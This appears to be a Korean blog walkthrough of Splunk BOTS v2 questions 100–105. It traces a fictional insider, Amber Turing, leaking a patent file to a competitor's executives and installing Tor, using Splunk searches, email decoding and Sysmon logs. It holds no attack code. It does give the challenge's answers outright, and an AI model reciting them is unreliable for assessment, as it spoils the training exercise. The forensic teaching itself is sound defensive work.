-이 앱에 포함된 데이터는 2017년 8월 Splunk의 보안 전문가 팀(Dave Herrald, Ryan Kovar, Steve Brant, Jim Apger, John Stoner, Ken Westin, David Veuve 및 James Brodsky)이 생성한 것입니다. 그들은 인터넷에 연결된 몇 개의 실험 환경을 구축했습니다. 환경 내에는 Splunk Universal Forwarder 및 Splunk Stream으로 계측된 몇 개의 Windows 엔드포인트가 있었습니다. Forwarder는 전체 Microsoft Sysmon 배포 및 Windows 이벤트 로깅을 위한 모범 사례를 포함하여 Windows endpoint 모니터링을 위한 모범 사례로 구성되었습니다. 이 데이터셋은 트래픽을 캡처하고 웹 프록시 서비스를 제공하는 Palo Alto Networks 차세대 방화벽과 네트워크 기반 IDS를 제공하는 Suricata가 포함되었습니다. 그 결과 아래 데이터세트가 생성되었습니다.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://wind-flow.github.io/assets/built/images/splunk/bots/v2/b22.jpg&quot; alt=&quot;Scenario 2&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;100	Amber Turing was hoping for Frothly to be acquired by a potential competitor which fell through, but visited their website to find contact information for their executive team. What is the website domain that she visited? Answer guidance: Do not provide the FQDN. Answer example: google.com&lt;br /&gt;
-Amber Turing은 Frothly가 잠재적인 경쟁업체에 인수되기를 바랐지만, 웹사이트를 방문하여 경영진의 연락처를 찾았습니다. 그녀가 방문한 웹사이트 도메인은 무엇입니까? 주의 : 답은 FQDN형태가 아닙니다. 답변 예시: google.com&lt;/p&gt;
-
-&lt;details&gt;
-  &lt;summary&gt;hint#1&lt;/summary&gt;
-    Look at Amber's web traffic.&lt;br /&gt;
-    Amber의 웹 트래픽을 보십시오.
-&lt;/details&gt;
-
-&lt;details&gt;
-  &lt;summary&gt;hint#2&lt;/summary&gt;
-    Find Amber's hostname and find the IP address that she was most likely using. Then look at the stream:http sourcetype.&lt;br /&gt;
-    Amber의 호스트 이름을 찾고 그녀가 사용했을 가능성이 가장 높은 IP 주소를 찾습니다. 그런 다음 stream:http 소스 유형을 보십시오.
-&lt;/details&gt;
-
-&lt;details&gt;
-  &lt;summary&gt;hint#3&lt;/summary&gt;
-    Take a look at src_ip=10.0.2.101 and the stream:http sourcetype. Look at the websites that Amber visited over the month of August.&lt;br /&gt;
-    src_ip=10.0.2.101 및 stream:http 소스 유형을 살펴보십시오. Amber가 8월 한 달 동안 방문한 웹사이트를 보십시오
-&lt;/details&gt;
-
-&lt;p&gt;Amber Turing의 IP를 파악하고, stream:http에서 해당 IP가 src인 url을 확인해보면 될것입니다.&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Amber Turing
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;src칼럼을 보면 10.0.4.4와 10.0.2.101의 이벤트 수가 가장 많습니다.&lt;/p&gt;
-
-&lt;p&gt;두가지 모두 src필드로 검색해보면, 10.0.4.4는 stream:smb에서 찾을 수 있는데, amber의 이름이 filename에 포함되어있습니다.
-한편, 10.0.2.101는 sourcetype pan:traffic에서 출발지가 frothly\amber.turing인 데이터를 보아, amber turing의 IP는 10.0.2.101입니다.&lt;/p&gt;
-
-&lt;p&gt;frothly의 경쟁회사라고 했으니, 해당 기업의 산업을 찾아봅니다.
-&lt;img src=&quot;https://wind-flow.github.io/assets/built/images/splunk/bots/v2/2021-10-21-09-54-13.png&quot; alt=&quot;frothly&quot; /&gt;
-frothly는 맥주제조회사임을 알 수 있습니다.&lt;/p&gt;
-
-&lt;p&gt;src=10.0.2.101를 두고, http로그를 조사해봅니다. 추가로, 방문한 웹사이트니 method를 GET으로 두어 탐색범위를 줄입시다.&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;src=10.0.2.101 sourcetype=stream:http http_method=GET
-| stats count by site
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;table&gt;
-  &lt;thead&gt;
-    &lt;tr&gt;
-      &lt;th&gt;site&lt;/th&gt;
-      &lt;th&gt;count&lt;/th&gt;
-    &lt;/tr&gt;
-  &lt;/thead&gt;
-  &lt;tbody&gt;
-    &lt;tr&gt;
-      &lt;td&gt;uranus.frothly.local:8014&lt;/td&gt;
-      &lt;td&gt;593&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;img-s-msn-com.akamaized.net&lt;/td&gt;
-      &lt;td&gt;353&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;crl.microsoft.com&lt;/td&gt;
-      &lt;td&gt;86&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;clienttemplates.content.office.net&lt;/td&gt;
-      &lt;td&gt;69&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;redirector.gvt1.com&lt;/td&gt;
-      &lt;td&gt;39&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;www.finnegan.com&lt;/td&gt;
-      &lt;td&gt;24&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;ping.chartbeat.net&lt;/td&gt;
-      &lt;td&gt;18&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;www1.folha.uol.com.br&lt;/td&gt;
-      &lt;td&gt;18&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;classificados1.folha.uol.com.br&lt;/td&gt;
-      &lt;td&gt;13&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;static-hp-wus-s-msn-com.akamaized.net&lt;/td&gt;
-      &lt;td&gt;12&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;www.berkbeer.com&lt;/td&gt;
-      &lt;td&gt;12&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;www.bing.com&lt;/td&gt;
-      &lt;td&gt;12&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;ocsp.digicert.com&lt;/td&gt;
-      &lt;td&gt;11&lt;/td&gt;
-    &lt;/tr&gt;
-  &lt;/tbody&gt;
-&lt;/table&gt;
-
-&lt;p&gt;site 중 berkbeer.com가 눈에 보입니다. forthly도 맥주회사니, berkbeer가 Ambur가 방문한 경쟁회사의 사이트는 berkbeer.com입니다.&lt;/p&gt;
-
-&lt;p&gt;답 : berkbeer.com&lt;/p&gt;
-
-&lt;p&gt;101	Amber found the executive contact information and sent him an email. What is the CEO’s name? Provide the first and last name.&lt;br /&gt;
-Amber는 임원 연락처 정보를 찾아 이메일을 보냈습니다. CEO의 이름은 무엇입니까? 이름과 성을 제공하십시오.&lt;/p&gt;
-
-&lt;details&gt;
-  &lt;summary&gt;hint#1&lt;/summary&gt;
-    Look for emails to Amber Turing.&lt;br /&gt;
-    Amber Turing에게 보내는 이메일주소를 찾으세요.
-&lt;/details&gt;
-
-&lt;details&gt;
-  &lt;summary&gt;hint#2&lt;/summary&gt;
-    Find emails from aturing that were sent to the domain from question 100.&lt;br /&gt;
-    문제 100번에서 도메인으로 보낸 aturing의 이메일 찾아보세요.
-&lt;/details&gt;
-&lt;details&gt;
-  &lt;summary&gt;hint#3&lt;/summary&gt;
-    Look at the sourcetype=stream:smtp and filter on the sender=aturing@froth.ly and/or recipient=aturing@froth.ly. Look at the content and body of emails that have something to do with competitors. The name of the CEO should be in the email.&lt;br /&gt;
-    sourcetype=stream:smtp를 보고 sender=aturing@froth.ly 및/또는 recipient=aturing@froth.ly를 필터링합니다. 경쟁자와 관련이 있는 이메일의 내용과 본문을 살펴보십시오. CEO의 이름은 이메일에 있어야 합니다.
-&lt;/details&gt;
-
-&lt;p&gt;이메일 관련 데이터는 sourcetype stream:smtp에 있을것입니다.
-송수신자의 도메인이 forthly.ly, berkbeer.com인 데이터를 찾아봅시다.&lt;/p&gt;
-
-&lt;p&gt;우선 amber turing의 이메일주소를 찾아봅니다.&lt;/p&gt;
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sourcetype=stream:smtp amber turing
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;sender필드를 보면 Amber Turing &lt;a href=&quot;mailto:aturing@froth.ly&quot;&gt;aturing@froth.ly&lt;/a&gt;인것으로 보아 amber의 이메일주소는 
-aturing@froth.ly 입니다.&lt;/p&gt;
-
-&lt;p&gt;receiver의 도메인주소가 @berkbeer.com를 찾고, 메일 본문에 CEO란 단어가 있을것입니다.
-키워드에 CEO를 추가합시다.&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sourcetype=stream:smtp aturing@froth.ly @berkbeer.com ceo
-| reverse
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;위 쿼리로 검색하면, content필드에 아래의 내용을 볼 수 있다.&lt;br /&gt;
- Hello Amber,=C2=A0=0A=0AGreat to hear from you, yes it is unfortunate th=
-e way things turned=0Aout. It would be great to speak with you directly,=
- I would also like=0Ato have Bernhard on the call as I think he might ha=
-ve some questions=0Afor you. =C2=A0Give me a call this afternoon if you=
- are free.=C2=A0=0A=0A&lt;strong&gt;Martin Berk=0ACEO&lt;/strong&gt;=0A777.222.8765=0Amberk@berkbeer.=
-com=0A=0A—– Original Message —–=0AFrom: “Amber Turing” &amp;lt;aturing@fr=
-oth.ly&amp;gt;=0ATo:”mberk@berkbeer.com” &lt;a href=&quot;mailto:mberk@berkbeer.com&quot;&gt;mberk@berkbeer.com&lt;/a&gt;=0ACc:=0ASent:Fri,=
- 11 Aug 2017 15:49:01 +0000=0ASubject:Amber from Froth.ly=0A=0A=09Mr. Be=
-rnhard,=0A=0A=09=C2=A0=C2=A0 I was very sorry to hear about the acquisit=
-ion falling through.=0AI was very excited to work with you in the future=
-.. I have to admit, I=0Aam a little worried about my future here. I=E2=80=
-=99d love to talk to you=0Aabout some information I have regarding my wo=
-rk.=0A=0A Amber Turing=0A Principal Scientist=0A 867.322.1123=0A Froth.l=
-y=0A=0A=09&lt;/p&gt;
-
-&lt;p&gt;smtp의 데이터는 base64로 인코딩되는 경우가 많습니다.
-5번째줄을 보면 Martin Berk CEO의 내용이 있습니다.&lt;/p&gt;
-
-&lt;p&gt;답 : Martin Berk&lt;/p&gt;
-
-&lt;p&gt;102	After the initial contact with the CEO, Amber contacted another employee at this competitor. What is that employee’s email address?&lt;br /&gt;
-CEO와 처음 연락한 후 Amber는 이 경쟁업체의 다른 직원에게 연락했습니다. 그 직원의 이메일 주소는 무엇입니까?&lt;/p&gt;
-
-&lt;details&gt;
-  &lt;summary&gt;hint#1&lt;/summary&gt;
-  Look at Amber's email traffic.&lt;br /&gt;
-  Amber의 이메일 트래픽을 보세요.
-&lt;/details&gt;
-
-&lt;details&gt;
-  &lt;summary&gt;hint#2&lt;/summary&gt;
-  Find the last email from the domain in question 100.&lt;br /&gt;
-  100번 문제의 도메인에서 보낸 마지막 이메일을 찾습니다.
-&lt;/details&gt;
-
-&lt;p&gt;Martin Berk의 이메일 주소는 mberk@berkbeer.com입니다.&lt;br /&gt;
-mberk의 이메일 대화를 파악하면 다른직원의 이메일 주소를 알 수 있을것입니다.&lt;/p&gt;
-
-&lt;p&gt;전 문제에서 파악한 메일의 내용을 다시 봅시다.&lt;/p&gt;
-
-&lt;p&gt;Hello Amber,=C2=A0=0A=0AGreat to hear from you, yes it is unfortunate th=
-e way things turned=0Aout. It would be great to speak with you directly,=
- I would also like=0Ato have Bernhard on the call as I think he might ha=
-ve some questions=0Afor you. =C2=A0Give me a call this afternoon if you=
- are free.=C2=A0=0A=0AMartin Berk=0ACEO=0A777.222.8765=0Amberk@berkbeer.=
-com=0A=0A—– Original Message —–=0AFrom: “Amber Turing” &amp;lt;aturing@fr=
-oth.ly&amp;gt;=0ATo:”mberk@berkbeer.com” &lt;a href=&quot;mailto:mberk@berkbeer.com&quot;&gt;mberk@berkbeer.com&lt;/a&gt;=0ACc:=0ASent:Fri,=
- 11 Aug 2017 15:49:01 +0000=0ASubject:Amber from Froth.ly=0A=0A=09&lt;strong&gt;Mr. Be=
-rnhard&lt;/strong&gt;,=0A=0A=09=C2=A0=C2=A0 I was very sorry to hear about the acquisit=
-ion falling through.=0AI was very excited to work with you in the future=
-.. I have to admit, I=0Aam a little worried about my future here. I=E2=80=
-=99d love to talk to you=0Aabout some information I have regarding my wo=
-rk.=0A=0A Amber Turing=0A Principal Scientist=0A 867.322.1123=0A Froth.l=
-y=0A=0A=09&lt;/p&gt;
-
-&lt;p&gt;언뜻 지나가기 쉽지만 Mr. Bernhard에게 질문하라는 내용이 있습니다.&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sourcetype=stream:smtp amber bernhard
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;위 쿼리 결과에서 메일을 읽기전에 receiver 필드에 어떤 내용이 있는지 파악해봅시다.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://wind-flow.github.io/assets/built/images/splunk/bots/v2/2021-10-21-15-35-13.png&quot; alt=&quot;receiver&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;bernhard의 이메일을 찾을 수 있습니다.&lt;/p&gt;
-
-&lt;p&gt;답 : hbernhard@berkbeer.com&lt;/p&gt;
-
-&lt;p&gt;103	What is the name of the file attachment that Amber sent to a contact at the competitor?&lt;br /&gt;
-Amber가 경쟁업체 연락처에 보낸 첨부 파일 이름은 무엇입니까?&lt;/p&gt;
-&lt;details&gt;
-  &lt;summary&gt;hint#1&lt;/summary&gt;
-  Look for emails sent from Amber Turing.&lt;br /&gt;
-  Amber Turing이 보낸 이메일을 찾습니다.
-&lt;/details&gt;
-
-&lt;details&gt;
-  &lt;summary&gt;hint#2&lt;/summary&gt;
-  Look for aturing@froth.ly sending email to the address listed in question 102.&lt;br /&gt;
-  문제 102에 나열된 주소로 이메일을 보내는 aturing@froth.ly를 찾으십시오.
-&lt;/details&gt;
-
-&lt;details&gt;
-  &lt;summary&gt;hint#3&lt;/summary&gt;
-  Search sourcetype=stream:smtp sender=aturing@froth.ly and find the attachment she sent.&lt;br /&gt;
-  sourcetype=stream:smtp sender=aturing@froth.ly를 검색하고 그녀가 보낸 첨부 파일을 찾습니다.
-&lt;/details&gt;
-
-&lt;p&gt;sender가 aturing@froth.ly이고, receiver의 도메인이 berkbeer.com인 데이터 중 attach_file관련 필드의 값을 확인해 봅시다.&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sourcetype=stream:smtp sender_email=aturing@froth.ly receiver_email{}=*@berkbeer.com
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;해당 결과의 attach_filename{}이라는 필드에 값이 한개만 존재하는걸 알 수 있습니다.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://wind-flow.github.io/assets/built/images/splunk/bots/v2/2021-10-21-15-55-05.png&quot; alt=&quot;attach_filename&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;답 : Saccharomyces_cerevisiae_patent.docx&lt;/p&gt;
-
-&lt;p&gt;104	What is Amber’s personal email address?&lt;br /&gt;
-Amber의 개인 이메일주소는 무엇입니까 ?&lt;/p&gt;
-
-&lt;details&gt;
-  &lt;summary&gt;hint#1&lt;/summary&gt;
-  Look for emails sent from Amber Turing.
-  Amber Turing이 보낸 이메일을 찾습니다.
-&lt;/details&gt;
-&lt;details&gt;
-  &lt;summary&gt;hint#2&lt;/summary&gt;
-  Review the body of emails that Amber has sent.
-  Amber가 보낸 이메일 본문을 검토합니다.
-&lt;/details&gt;
-&lt;details&gt;
-  &lt;summary&gt;hint#3&lt;/summary&gt;
-  Review the email with base64-encoded text for body (or content) and decode the base64.
-  본문(또는 콘텐츠)에 대해 base64로 인코딩된 텍스트가 포함된 이메일을 검토하고 base64를 디코딩합니다.
-&lt;/details&gt;
-
-&lt;p&gt;계속해서 amber와 bern의 대화를 파악해 봅시다.&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sourcetype=stream:smtp aturing@froth.ly hbernhard@berkbeer.com
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;둘이 나눈 마지막 content의 내용을 보면 base64코드로 보이는 내용을 발견할 수 있습니다. 이것을 decode 해보면 Amber의 개인 이메일주소를 파악할 수 있습니다.&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;
-    &lt;p&gt;base64 인코딩&lt;br /&gt;
-VGhhbmtzIGZvciB0YWtpbmcgdGhlIHRpbWUgdG9kYXksIEFzIGRpc2N1c3NlZCBoZXJlIGlzIHRo
-ZSBkb2N1bWVudCBJIHdhcyByZWZlcnJpbmcgdG8uICBQcm9iYWJseSBiZXR0ZXIgdG8gdGFrZSB0
-aGlzIG9mZmxpbmUuIEVtYWlsIG1lIGZyb20gbm93IG9uIGF0IGFtYmVyc3RoZWJlc3RAeWVhc3Rp
-ZWJlYXN0aWUuY29tPG1haWx0bzphbWJlcnN0aGViZXN0QHllYXN0aWViZWFzdGllLmNvbT4NCg0K
-RnJvbTogaGJlcm5oYXJkQGJlcmtiZWVyLmNvbTxtYWlsdG86aGJlcm5oYXJkQGJlcmtiZWVyLmNv
-bT4gW21haWx0bzpoYmVybmhhcmRAYmVya2JlZXIuY29tXQ0KU2VudDogRnJpZGF5LCBBdWd1c3Qg
-MTEsIDIwMTcgOTowOCBBTQ0KVG86IEFtYmVyIFR1cmluZyA8YXR1cmluZ0Bmcm90aC5seTxtYWls
-dG86YXR1cmluZ0Bmcm90aC5seT4+DQpTdWJqZWN0OiBIZWlueiBCZXJuaGFyZCBDb250YWN0IElu
-Zm9ybWF0aW9uDQoNCkhlbGxvIEFtYmVyLA0KDQpHcmVhdCB0YWxraW5nIHdpdGggeW91IHRvZGF5
-LCBoZXJlIGlzIG15IGNvbnRhY3QgaW5mb3JtYXRpb24uIERvIHlvdSBoYXZlIGEgcGVyc29uYWwg
-ZW1haWwgSSBjYW4gcmVhY2ggeW91IGF0IGFzIHdlbGw/DQoNClRoYW5rIFlvdQ0KDQpIZWlueiBC
-ZXJuaGFyZA0KaGVybmhhcmRAYmVya2JlZXIuY29tPG1haWx0bzpoZXJuaGFyZEBiZXJrYmVlci5j
-b20+DQo4NjUuODg4Ljc1NjMNCg0K&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;base64 디코딩&lt;br /&gt;
-Thanks for taking the time today, As discussed here is the document I was referring to.  Probably better to take this offline. Email me from now on at ambersthebest@yeastiebeastie.com&amp;lt;mailto:ambersthebest@yeastiebeastie.com&amp;gt;&lt;/p&gt;
-  &lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;From: hbernhard@berkbeer.com&lt;a href=&quot;mailto:hbernhard@berkbeer.com&quot;&gt;hbernhard@berkbeer.com&lt;/a&gt; [mailto:hbernhard@berkbeer.com]&lt;br /&gt;
-Sent: Friday, August 11, 2017 9:08 AM&lt;br /&gt;
-To: Amber Turing &amp;lt;aturing@froth.ly&lt;a href=&quot;mailto:aturing@froth.ly&quot;&gt;aturing@froth.ly&lt;/a&gt;&amp;gt;&lt;br /&gt;
-Subject: Heinz Bernhard Contact Information&lt;/p&gt;
-
-&lt;p&gt;Hello Amber,&lt;/p&gt;
-
-&lt;p&gt;Great talking with you today, here is my contact information. Do you have a personal email I can reach you at as well?&lt;/p&gt;
-
-&lt;p&gt;Thank You&lt;/p&gt;
-
-&lt;p&gt;Heinz Bernhard&lt;br /&gt;
-hernhard@berkbeer.com&lt;a href=&quot;mailto:hernhard@berkbeer.com&quot;&gt;hernhard@berkbeer.com&lt;/a&gt;&lt;br /&gt;
-865.888.7563&lt;/p&gt;
-
-&lt;p&gt;디코딩 내용에 amber의 개인 이메일주소를 발견할 수 있습니다.&lt;/p&gt;
-
-&lt;p&gt;답 : ambersthebest@yeastiebeastie.com&lt;/p&gt;
-
-&lt;p&gt;105	What version of TOR did Amber install to obfuscate her web browsing? Answer guidance: Numeric with one or more delimiter.&lt;br /&gt;
-Amber는 웹 브라우징을 난독화하기 위해 어떤 버전의 TOR를 설치했습니까? 답변 안내: 하나 이상의 구분 기호가 있는 숫자.&lt;/p&gt;
-
-&lt;p&gt;TOR 설치관련 이벤트는 sysmon에 있을것입니다.
-keyword를 amber와 tor를 두고 검색해 봅시다.
-(ParentCommandLine과 Commandline에 tor가 포함될것으로 예상됩니다.)&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sourcetype=&quot;XmlWinEventLog:Microsoft-Windows-Sysmon/Operational&quot; CommandLine=*tor* ParentCommandLine=*tor* Amber
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'&amp;gt;&amp;lt;System&amp;gt;&amp;lt;Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/&amp;gt;&amp;lt;EventID&amp;gt;1&amp;lt;/EventID&amp;gt;&amp;lt;Version&amp;gt;5&amp;lt;/Version&amp;gt;&amp;lt;Level&amp;gt;4&amp;lt;/Level&amp;gt;&amp;lt;Task&amp;gt;1&amp;lt;/Task&amp;gt;&amp;lt;Opcode&amp;gt;0&amp;lt;/Opcode&amp;gt;&amp;lt;Keywords&amp;gt;0x8000000000000000&amp;lt;/Keywords&amp;gt;&amp;lt;TimeCreated SystemTime='2017-08-24T04:20:44.276520600Z'/&amp;gt;&amp;lt;EventRecordID&amp;gt;118559&amp;lt;/EventRecordID&amp;gt;&amp;lt;Correlation/&amp;gt;&amp;lt;Execution ProcessID='900' ThreadID='1824'/&amp;gt;&amp;lt;Channel&amp;gt;Microsoft-Windows-Sysmon/Operational&amp;lt;/Channel&amp;gt;&amp;lt;Computer&amp;gt;wrk-aturing.frothly.local&amp;lt;/Computer&amp;gt;&amp;lt;Security UserID='S-1-5-18'/&amp;gt;&amp;lt;/System&amp;gt;&amp;lt;EventData&amp;gt;&amp;lt;Data Name='UtcTime'&amp;gt;2017-08-24 04:20:44.260&amp;lt;/Data&amp;gt;&amp;lt;Data Name='ProcessGuid'&amp;gt;{B2E0DF5E-9CF4-598C-0000-00103B38CC01}&amp;lt;/Data&amp;gt;&amp;lt;Data Name='ProcessId'&amp;gt;2252&amp;lt;/Data&amp;gt;&amp;lt;Data Name='Image'&amp;gt;C:\Users\amber.turing\Desktop\Tor Browser\Browser\firefox.exe&amp;lt;/Data&amp;gt;&amp;lt;Data Name='CommandLine'&amp;gt;&quot;C:\Users\amber.turing\Desktop\Tor Browser\Browser\firefox.exe&quot; &amp;lt;/Data&amp;gt;&amp;lt;Data Name='CurrentDirectory'&amp;gt;C:\Users\amber.turing\Desktop\Tor Browser\Browser\&amp;lt;/Data&amp;gt;&amp;lt;Data Name='User'&amp;gt;FROTHLY\amber.turing&amp;lt;/Data&amp;gt;&amp;lt;Data Name='LogonGuid'&amp;gt;{B2E0DF5E-B9C1-598B-0000-0020ED760900}&amp;lt;/Data&amp;gt;&amp;lt;Data Name='LogonId'&amp;gt;0x976ed&amp;lt;/Data&amp;gt;&amp;lt;Data Name='TerminalSessionId'&amp;gt;1&amp;lt;/Data&amp;gt;&amp;lt;Data Name='IntegrityLevel'&amp;gt;Medium&amp;lt;/Data&amp;gt;&amp;lt;Data Name='Hashes'&amp;gt;SHA1=82EEBDA7E828142E1FA55066D793D29FB81B48C5&amp;lt;/Data&amp;gt;&amp;lt;Data Name='ParentProcessGuid'&amp;gt;{B2E0DF5E-9CDF-598C-0000-00101AF3CB01}&amp;lt;/Data&amp;gt;&amp;lt;Data Name='ParentProcessId'&amp;gt;4536&amp;lt;/Data&amp;gt;&amp;lt;Data Name='ParentImage'&amp;gt;C:\Users\amber.turing\Downloads\torbrowser-install-7.0.4_en-US.exe&amp;lt;/Data&amp;gt;&amp;lt;Data Name='ParentCommandLine'&amp;gt;&quot;C:\Users\amber.turing\Downloads\torbrowser-install-7.0.4_en-US.exe&quot; &amp;lt;/Data&amp;gt;&amp;lt;/EventData&amp;gt;&amp;lt;/Event&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;tor 설치파일의 이름과 경로를 찾을 수 있었습니다.
-C:\Users\amber.turing\Downloads\torbrowser-install-7.0.4_en-US.exe&lt;/p&gt;
-
-&lt;p&gt;답 : 7.0.4&lt;/p&gt;</content>
 
       
       
